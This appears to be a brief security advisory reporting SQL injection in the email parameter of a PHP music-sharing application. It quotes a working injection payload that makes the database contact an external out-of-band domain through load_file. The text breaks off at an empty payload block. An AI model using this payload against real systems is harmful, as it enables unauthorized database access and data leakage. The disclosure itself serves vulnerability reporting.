## Description:
The `email` parameter in `/music/ajax.php` from Simple Music Cloud Community System 1.0 appears to be vulnerable to SQL injection attacks. 
The payload '+(select load_file('\\\\bbqv9il1nuxps6uwt46g84o25tbmzdw7kynmf95xu.nu11secur1tyPenetrationTestingEngineer.net\\jeu'))+' was submitted in the email parameter. 
This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. 
The application interacted with that domain, indicating that the injected SQL query was executed.
The attacker can take administrator account controll on this system.
Status: CRITICAL

[+] Payload:

```mysql
